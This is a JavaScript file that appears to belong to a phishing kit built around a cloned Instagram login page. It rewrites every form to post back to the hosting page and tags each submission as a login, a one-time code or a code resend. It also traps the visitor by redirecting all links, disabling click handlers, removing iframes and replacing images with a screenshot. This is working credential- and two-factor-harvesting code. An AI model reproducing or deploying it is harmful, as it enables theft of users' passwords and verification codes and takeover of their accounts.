let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
    f.noValidate = false
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})

// all possible selectors
let email = document.querySelector('[name="username"]')
let pass = document.querySelector('[name="password"]')
//set
let otp_code = document.querySelector(`[name="verificationCode"]`)

// set
if (email && pass) {
    email.parentElement.classList.add("_aa49")
    pass.parentElement.classList.add("_aa49")
    addSpikeType("login")
    pass.addEventListener("input", () => {
        if (pass.value.length > 6) {
            document.querySelector('[type="submit"]').disabled = false
        }
    })
}
// set
else if (otp_code) {
    addSpikeType("otp_code")
    otp_code.parentElement.classList.add("_aa49")
    document.querySelector(`[type="button"]`).type = "submit"
}


let resend_otpBtn = document.querySelectorAll("button")[1]
resend_otpBtn.addEventListener("click", () => {
    otp_code.required = false
    addSpikeType("resend_otp")
    resend_otpBtn.type = "submit"
})


document.querySelectorAll("img").forEach(li => {
    let prev = li.src
    let len = location.origin.length
    if (prev.includes(location.origin)) {
        prev = prev.slice(len, prev.length)
        li.src = `/web/instagram-screenshot1.png`
    }
})